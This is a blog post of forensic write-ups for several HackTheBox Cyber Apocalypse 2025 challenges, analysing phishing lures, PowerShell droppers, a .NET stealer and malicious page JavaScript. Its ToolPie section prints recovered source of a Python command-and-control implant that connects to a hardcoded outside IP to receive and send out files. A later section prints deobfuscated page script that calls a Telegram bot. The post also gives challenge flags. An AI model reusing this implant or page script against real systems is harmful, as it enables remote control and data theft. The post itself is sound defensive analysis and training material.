---
layout: post
title: HTB Cyber Apocalypse CTF 2025 - Tales from Eldoria
description: My writeups for some forensic challenges
tags: [HackTheBox, Writeup, Command and Control, Powershell, Blue Team, Python, Malware, dnSpy]
---

Hi guys, it has been a long time I did not post anything on my blog. Today is a special day since it is the end of HTB Cyber Apocalypse CTF 2025. Now this is my writeup for some forensic challenges. I hope that these solutions will be useful with all of you. Let's go! 

![image](https://github.com/user-attachments/assets/44770e0e-db68-44ec-a499-fd5e2a37ef5e)

### Thorin’s Amulet + A new Hire

![image](https://github.com/user-attachments/assets/f9fb273c-7f26-4529-b6f3-4b1167d05328)

![image](https://github.com/user-attachments/assets/10ed2084-adc0-42b1-ac9e-c422ed6e4f4b)

They are the easy challenges, so I will explain them quickly to spend time for the medium and hard challenge. First, with **Thorin’s Amulet**, they gave us an Powershell file, open it and you will see an base64 
string. Decode and you will get another URL: 

![image](https://github.com/user-attachments/assets/b26a7781-ca6f-4e65-abfb-cb985aad776d)

![image](https://github.com/user-attachments/assets/6de44b2c-ba47-40a6-aa44-090afa9a9c62)

Spawning Docker, access **update** endpoint and it will download another Powershell file: **update.ps1**:

![image](https://github.com/user-attachments/assets/72f65a73-094b-4e58-8d68-428123ef9893)

![image](https://github.com/user-attachments/assets/f083bb17-c6b2-4217-af8d-4594d8e9c62a)

You can see that it will download **a541a.ps1** and execute it. Now we just run the **Invoke-WebRequest** command, we will get the file: 

![image](https://github.com/user-attachments/assets/a56b4d60-c971-41d8-9c77-4617aaddc57f)

It will decode the string from hex format. Now we just decode it and you will get the flag: 

![image](https://github.com/user-attachments/assets/88db1d4c-bef9-4e72-9644-d747cbd4ae9f)

**Flag: HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}**

Next, we will discuss about **A new Hire**, they gave us a file named **email.eml**, we can open it by using **Thunderbird**:

![image](https://github.com/user-attachments/assets/324418fd-4ecf-4ddb-9107-2bfb6c1345a8)

In summary, his CV can open by accessing **index.php**, now we will spawn the Docker and access the endpoint: 

![image](https://github.com/user-attachments/assets/2062686b-fec6-48ca-9ad9-a797f1b3c009)

This is the interface of the website, inspecting the website we can see it will download file from a directory: 

![image](https://github.com/user-attachments/assets/af8be768-1f60-44f7-80af-23ea3ad24e0b)

![image](https://github.com/user-attachments/assets/24ea8fee-d4e3-4d68-941d-e2160504a455)

I access **parent directory** and I found an suspicious directory: **configs**:

![image](https://github.com/user-attachments/assets/18d8958d-77ca-4f05-bccb-800e4bd36275)

Click to **client.py**, decode the key and get the flag:

![image](https://github.com/user-attachments/assets/dd986df3-8320-4035-b069-7b82abc14560)

![image](https://github.com/user-attachments/assets/f0ff4d43-424e-423b-84a5-199b654b8a8a)

**Flag: HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}**

### Slient trap

![image](https://github.com/user-attachments/assets/031ad497-98f6-4aac-8d1e-d342d4d4b839)

This challenge was created by my big brother: **bquanman** and every year I join HTB, I love his challenges so much. It's kinda long so I will 
summarise how I solved them:

**1. What is the subject of the first email that the victim opened and replied to?**: Check in HTTP stream 4

![image](https://github.com/user-attachments/assets/59981f65-94b6-4afe-83e6-af0170cb1e51)

**2. On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)**: Check in HTTP stream 8

![image](https://github.com/user-attachments/assets/31d9da7a-bfa1-4bda-a750-4ad23dc465b4)

**3. What is the MD5 hash of the malware file?**: 

![image](https://github.com/user-attachments/assets/f9324012-3282-4b51-b86e-49130c3c55b9)

![image](https://github.com/user-attachments/assets/dc9e6853-07bb-4c81-ba7b-72173671a965)

This zip file was locked by password, you could look for password also in HTTP stream 8:

![image](https://github.com/user-attachments/assets/bd678cdb-bb97-4c75-bc0c-bc921e5aeccf)

Unzip by password we found, use **md5sum** and you will get the answer: 

![image](https://github.com/user-attachments/assets/d394859c-1c28-4fc9-b2a1-44fd32b3d5ca)

**4. What credentials were used to log into the attacker's mailbox? (Format: username:password)**:

The exe file we found was compiled by .NET, then we can use **dnSpy** to decompile. Looking at the code and you will see the credential:

![image](https://github.com/user-attachments/assets/8391ca5f-1e4b-449b-b5d3-c17d1b04ffa7)

**5. What is the name of the task scheduled by the attacker?**: 

Digging deeper to the code, you will see the encrypt function which was used to encrypt the traffic: 

![image](https://github.com/user-attachments/assets/21bf2af8-4066-4824-a453-ed4733ba24d3)

From here you can decrypt the traffic easily because it used **RC4** and **XOR** to encrypt: 

```python
import base64
def rc4(key, data):
    S = list(range(256))
    key_bytes = bytearray(key)
    j = 0
    for i in range(256):
        j = (j + S[i] + key_bytes[i % len(key_bytes)]) % 256
        S[i], S[j] = S[j], S[i]
    result = bytearray(len(data))
    i = j = 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result[k] = data[k] ^ S[(S[i] + S[j]) % 256]
    
    return bytes(result)

key = bytearray([
    168, 115, 174, 213, 168, 222, 72, 36, 91, 209, 242, 128, 69, 99, 195, 164,
    238, 182, 67, 92, 7, 121, 164, 86, 121, 10, 93, 4, 140, 111, 248, 44,
    30, 94, 48, 54, 45, 100, 184, 54, 28, 82, 201, 188, 203, 150, 123, 163,
    229, 138, 177, 51, 164, 232, 86, 154, 179, 143, 144, 22, 134, 12, 40, 243,
    55, 2, 73, 103, 99, 243, 236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
    111, 240, 108, 86, 85, 63, 44, 49, 241, 6, 3, 170, 131, 150, 53, 49,
    126, 72, 60, 36, 144, 248, 55, 10, 241, 208, 163, 217, 49, 154, 206, 227,
    25, 99, 18, 144, 134, 169, 237, 100, 117, 22, 11, 150, 157, 230, 173, 38,
    72, 99, 129, 30, 220, 112, 226, 56, 16, 114, 133, 22, 96, 1, 90, 72,
    162, 38, 143, 186, 35, 142, 128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
    246, 232, 205, 236, 254, 152, 145, 98, 126, 29, 217, 74, 177, 142, 19, 190,
    182, 151, 233, 157, 76, 74, 104, 155, 79, 115, 5, 18, 204, 65, 254, 204,
    118, 71, 92, 33, 58, 112, 206, 151, 103, 179, 24, 164, 219, 98, 81, 6,
    241, 100, 228, 190, 96, 140, 128, 1, 161, 246, 236, 25, 62, 100, 87, 145,
    185, 45, 61, 143, 52, 8, 227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
    227, 9, 146, 156, 208, 206, 194, 134, 194, 23, 233, 100, 38, 158, 58, 159
])

def decrypt(base64_data):
    encrypted_bytes = base64.b64decode(base64_data)
    decrypted_bytes = rc4(key, encrypted_bytes)
    return decrypted_bytes

decrypted = decrypt("") #put your input here
print(decrypted.decode('utf-8', errors='ignore')) 
```

After tried decrypting all commands, I got the scheduled task in **TCP Stream 35**:

![image](https://github.com/user-attachments/assets/d5184aa3-2c84-46aa-8f91-8df408e3c912)

**6. What is the API key leaked from the highly valuable file discovered by the attacker?**:

Do the same and you will get the API key in TCP stream 97: 

![image](https://github.com/user-attachments/assets/d7c82dcd-55c9-46e1-92a8-0f942e772b5d)

### ToolPie

This challenge was kinda bruh with me because of malware sample. Btw, it's still worth to try. 

**1. What is the IP address responsible for compromising the website?**: 194.59.6.66

A suspicious python file was uploaded to the server by this IP, so this is the answer

![image](https://github.com/user-attachments/assets/7fbee3b6-f10e-462a-b6de-88c15ea1132e)

**2. What is the name of the endpoint exploited by the attacker?**: execute

![image](https://github.com/user-attachments/assets/3707475f-9982-4f6e-9313-a4f3c9c988e4)

These questions aftter 

**3. What is the name of the obfuscation tool used by the attacker?**: 

These questions after were extremely tough because we could not run and decompile the file normally, instead we had to interact with **Python bytecode**. 
From here the best way is that you could try to encode the code by base64 and run it on Python: 

![image](https://github.com/user-attachments/assets/b568c9d1-ca5e-4d40-bfad-39b40ac964ed)

I hate these steps after since it took me a long time to do. Fortunately, I got a nearly completed source code but btw, it displayed nearly 95% how the python code worked. Also thank you my friend for helping me this step: 

```python
import os
import socket
import threading
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util import Padding

BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
CONN = ("13.61.7.218", 55155)

def enc_mes(mes, key):
    cipher = AES.new(key.encode(), AES.MODE_CBC)
    cypher_block = cipher.iv + cipher.encrypt(Padding.pad(mes.encode(), 16))
    return cypher_block

def dec_file_mes(mes, key):
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv=key.encode())
    s = Padding.unpad(cipher.decrypt(mes[16:]), 16)
    return s

def dec_mes(mes, key):
    try:
        cipher = AES.new(key.encode(), AES.MODE_CBC, iv=key.encode())
        v = Padding.unpad(cipher.decrypt(mes[16:]), 16)
        return v
    except Exception:
        return b"echo Try it again"

def receive_file():
    client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client2.connect(("13.61.7.218", 54163))
    
    # Receive file metadata
    received = client2.recv(BUFFER_SIZE).decode()
    filename, filesize = received.split(SEPARATOR)
    filesize = int(filesize)
    
    # Decrypt and save file
    with open(filename, "wb") as f:
        total_bytes = 0
        while total_bytes < filesize:
            bytes_read = client2.recv(BUFFER_SIZE)
            decr_file = dec_file_mes(bytes_read, "5UUfizsRsP7oOCAq")  # Key should be defined elsewhere
            f.write(decr_file)
            total_bytes += len(bytes_read)
    
    client2.send(enc_mes("ok2", "5UUfizsRsP7oOCAq"))
    client2.close()

def receive(client, k):
    client.settimeout(600)
    while True:
        try:
            message = client.recv(1024)
            msg = dec_mes(message, k)
            if msg == b"check":
                enc_answer = enc_mes("check-ok", k)
                client.send(enc_answer)
            elif msg == b"send_file":
                receive_file_thread = threading.Thread(target=receive_file)
                receive_file_thread.start()
            elif msg == b"get_file":
                with open("some_file", "rb") as f:  # File path should be dynamic
                    bytes_read = f.read()
                    bytes_enc = enc_mes(bytes_read, k)
                    client.sendall(bytes_enc)
            else:
                print("Bad command!")
        except Exception:
            time.sleep(10)
            print("Reconnect!")
            client.close()
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(CONN)
            continue

if __name__ == "__main__":
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("13.61.7.218", 55155))
    key = "5UUfizsRsP7oOCAq"  # This should be securely generated or provided
    receive_thread = threading.Thread(target=receive, args=(client, key))
    receive_thread.start()
```

Basically, the data in traffic was encrypted by AES-CBC which key and iv were same. It's easy to decrypt just using **CyberChef** (you can do it by yourself):

![image](https://github.com/user-attachments/assets/b1543681-30a1-4d59-a855-298c26399a22)

![image](https://github.com/user-attachments/assets/011b6c63-26de-4cf2-b47b-e849fb99084b)

![image](https://github.com/user-attachments/assets/625d3d49-3c5d-42b9-a809-08b9dfbfa12f)

### Tales for the Brave

This challenge is the greatest in this competition in my opinion. First, accessing the website: 

![image](https://github.com/user-attachments/assets/4cc704ec-01c9-4f13-b150-86825329b9e3)

Inspecting the website, looking at to the source code especially in **index.js**, it's obfuscated:

![image](https://github.com/user-attachments/assets/045728aa-b693-477a-a2d9-dea16ad65226)

You can deobfuscate it by using this [tool](https://deobfuscate.io/). Copying the code and you will get the new one: 

![image](https://github.com/user-attachments/assets/f40efde4-fa23-424c-819d-00968e525dfc)

From here I can extract the value of variable by just using Chrome console: 

![image](https://github.com/user-attachments/assets/d0252ffc-1345-407b-bdee-189cff9cc82d)

You can see it's related to AES and Base64. Next in the part 2 you can get the key and IV to decrypt AES content: 

```js
eval(CryptoJS[_$_9b39[1]][_$_9b39[0]]({ciphertext:CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape(".....")))},
CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape("..."))),
{iv:CryptoJS[_$_9b39[4]][_$_9b39[3]][_$_9b39[2]](btoa(unescape("....")))}).toString(CryptoJS[_$_9b39[4]][_$_9b39[5]]));
```

![image](https://github.com/user-attachments/assets/e22e06a2-861d-45ef-9452-91f635fe32a5)

![image](https://github.com/user-attachments/assets/bd2fa841-ae10-4077-a5aa-441a23c4bf61)

![image](https://github.com/user-attachments/assets/5e5aa04d-2eb0-4666-81d3-fdbb75aa8b9e)

Decrypt all contents and you will get the another source code:

```js
_$_5975 = ['nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==',
           's3cur3k3y',
           'Base64', 'enc', 'toString', '', 'join', 'SHA256', 
           '18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=', // Hash to verify
           'Utf8', 'parse', 'decrypt', 'RC4Drop', 'https://api.telegram.org', 
           'fromCharCode', 'onreadystatechange', 'readyState', 'DONE', 'responseText', 
           'text', 'result', 'log', 'replace', 'location', 'Form submitted!', 
           'GET', 'forwardMessage?chat_id=', '&from_chat_id=', '&message_id=5', 'open', 'send']

function G(r) {
    return function () {
        var r = Array.prototype.slice.call(arguments), o = r.shift();
        return r.reverse().map(function (r, t) { 
            return String.fromCharCode(r - o - 7 - t) 
        }).join('')
    }(43, 106, 167, 103, 163, 98) + 
    1354343..toString(36).toLowerCase() + 
    21..toString(36).toLowerCase().split('').map(function (r) { 
        return String.fromCharCode(r.charCodeAt() + -13) 
    }).join('') + 
    4..toString(36).toLowerCase() + 
    32..toString(36).toLowerCase().split('').map(function (r) { 
        return String.fromCharCode(r.charCodeAt() + -39) 
    }).join('') + 
    381..toString(36).toLowerCase().split('').map(function (r) { 
        return String.fromCharCode(r.charCodeAt() + -13) 
    }).join('') + 
    function () {
        var r = Array.prototype.slice.call(arguments), o = r.shift();
        return r.reverse().map(function (r, t) { 
            return String.fromCharCode(r - o - 60 - t) 
        }).join('')
    }(42, 216, 153, 153, 213, 187);
}

document.getElementById("newsletterForm").addEventListener("submit", function(e) {
  e.preventDefault();
  const emailField = document.getElementById("email");
  const descriptionField = document.getElementById("descriptionField");
  let isValid = true;
  if (!emailField.value) {
    emailField.classList.add("shake");
    isValid = false;
    setTimeout(() => {
      return emailField.classList.remove("shake");
    }, 500);
  }
  if (!isValid) {
    return;
  }
  const emailValue = emailField.value;
  const specialKey = emailValue.split("@")[0];
  const desc = parseInt(descriptionField.value, 10);
  f(specialKey, desc);
});

function f(oferkfer, icd) {
  const channel_id = -1002496072246;
  var enc_token = "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==";
  // _$_5975[1] = s3cur3k3y
  // _$_5975[8] = 18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=
  if (oferkfer === G(_$_5975[1]) && 
        CryptoJS.SHA256(sequence.join('')).toString(CryptoJS.enc.Base64) === _$_5975[8]) {
    var decrypted = CryptoJS.RC4Drop.decrypt(
            enc_token, 
            CryptoJS.enc.Utf8.parse(oferkfer), 
            { drop: 192 }
        ).toString(CryptoJS.enc.Utf8);
    var HOST = "https://api.telegram.org/bot"+ decrypted;
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        const resp = JSON.parse(xhr.responseText);
        try {
          const link = resp.result.text;
          window.location.replace(link);
        } catch (error) {
          alert("Form submitted!");
        }
      }
    };
    xhr.open("GET", HOST + "/" + "forwardMessage?chat_id=" + icd + "&from_chat_id=" + channel_id + "&message_id=5");
    xhr.send(null);
  } else {
    alert("Form submitted!");
  }
}
var sequence = [];

function l() {
  sequence.push(this.id);
}
var checkboxes = document.querySelectorAll("input[class=cb]");
for (var i = 0; i < checkboxes.length; i++) {
  checkboxes[i].addEventListener("change", l);
}
```
This script will connect to a Telegram channel, this was displayed by decrypting the base64 string:

![image](https://github.com/user-attachments/assets/3062ab58-361a-4fe7-959a-3a19a8af1d71)

From here I use my legendary tool: **telegram-bot-dumper** to listen their chat and I got another sample and its password: 

![image](https://github.com/user-attachments/assets/09c95f70-5a42-4b74-8fb0-4fcd105754fc)

![image](https://github.com/user-attachments/assets/dbb04c55-96bb-4100-a4b1-1a77e02014a1)

From here I used **FakeNet**, run the file and you will get a nice result:

![image](https://github.com/user-attachments/assets/33f05c07-47d3-4da9-8fbe-d2487be9b41d)

You will get a JWT token, use JWT decoder:

![image](https://github.com/user-attachments/assets/3365f247-f723-4766-a9cb-b64dbe8d7e81)

Decode the base64 2 time and you will get the flag:

![image](https://github.com/user-attachments/assets/76faa3cc-126b-4dad-9296-8d56704e435b)

This is my last words so far. Thank you for reading my article. I must say this is the best competition I have joined. 5 days are not long but also not short, but we were really united. Thank you HackTheBox for celebrating a good competition. Love a lot!



